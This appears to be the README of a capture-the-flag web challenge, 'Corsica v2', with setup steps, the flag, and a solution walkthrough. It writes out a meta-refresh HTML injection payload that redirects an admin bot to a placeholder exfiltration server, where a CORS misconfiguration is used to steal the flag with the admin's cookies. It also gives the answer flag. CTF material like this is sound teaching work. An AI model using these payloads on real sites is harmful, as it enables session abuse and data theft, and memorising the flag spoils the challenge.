# Corsica v2
## By Emil 'Dota' Bak @ 2026

## Description:
Tired of cold weather, rain, and insecure web applications?
Then welcome to Corsica!

## TL;DR:
CORS challenge, exploitable via HTML injection + meta refresh redirect (bypassing strict CSP) sent to an admin bot.

## Flag:
`BHCTF{m3t4_r3fr3sh_b34ts_csp_3very_t1me}`

## Handout:
* N/A (only a URL given)

## Setup
REMEMBER TO CHANGE app.py -> "HOSTNAME_FOR_ADMIN_BOT" TO POINT TO THE DOMAIN/IP OF THE SERVER THAT RUNS THE CHALLENGE, IF ITS GLOBAL REACHABLE IP/DNS

`docker compose up --build`

## Quick Solution
- `solution/exploit.html` -> modify `EXFIL_SERVER`
- `python3 solution/server.py`
- Create user + update Bio: `<meta http-equiv="refresh" content="0;url=https://<EXFIL_SERVER_IP>:8000/">`
- Go to: `https://<site>/tips`
- submit: `/profile/<your_profile_id>`
- Flag shows up in the exfil server cli

## Solution (walkthrough'ish)
* See `solution` folder for `exploit.html` and `server.py`. Note that `exploit.html` will point the adminbot to `https://localhost:443`, and NOT it's public/reachable IP. A hint is given in `tips.html` that the admin will login/reach the application via localhost.
* Modify the `exploit.html` -> `const EXFIL_SERVER = 'https://<EXPLOIT_SERVER>:<PORT>/exfil';` to match the IP/URL of the server hosting the `exploit.html` script.
* The key insight: the profile bio accepts raw HTML, but a strict CSP (`script-src 'none'`) prevents any JavaScript execution. However, CSP does NOT block `<meta http-equiv="refresh">` tags - this is a well-known CSP bypass for redirects.
* Inject a meta refresh redirect into your profile bio: `<meta http-equiv="refresh" content="0;url=https://<EXPLOIT_SERVER>:<PORT>/">`
* The old open redirect in `/cookie_check` has been patched (validates that `next` is a relative path). Players must find the HTML injection + CSP bypass instead.
* Send the admin to your profile via the "Travel Tips" feedback feature: `/profile/<your_profile_id>`
* The admin bot visits your profile, the meta refresh fires, redirecting to your exploit server.
* The exploit page uses CORS misconfiguration to fetch `/admin` with admin cookies, extract the flag token, retrieve the flag via `/retrieve_flag`, and exfiltrate it.

## Notes
The Docker running as "hosts" network technically leads to blind SSRF on the server.
